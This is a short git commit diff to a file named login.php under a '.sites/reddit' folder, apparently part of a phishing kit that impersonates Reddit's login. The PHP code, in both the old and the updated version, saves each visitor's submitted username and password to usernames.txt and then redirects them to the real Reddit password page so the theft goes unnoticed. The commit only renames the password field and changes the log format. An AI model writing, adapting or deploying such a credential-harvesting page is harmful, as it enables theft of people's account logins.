b692d0ae682ac6d1adf196716ab7aa32813340bc
render <fehrenbacherb07@gmail.com>
2025-11-21 00:25:42 -0600

    Update login.php

--- .sites/reddit/login.php
+++ .sites/reddit/login.php
@@ -1,6 +1,5 @@
-<?php
-
-file_put_contents("usernames.txt", "Reddit Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
+<?php 
+file_put_contents("usernames.txt", "Reddit Username: " . $_POST['username'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
 header('Location: https://www.reddit.com/password');
 exit();
 ?>
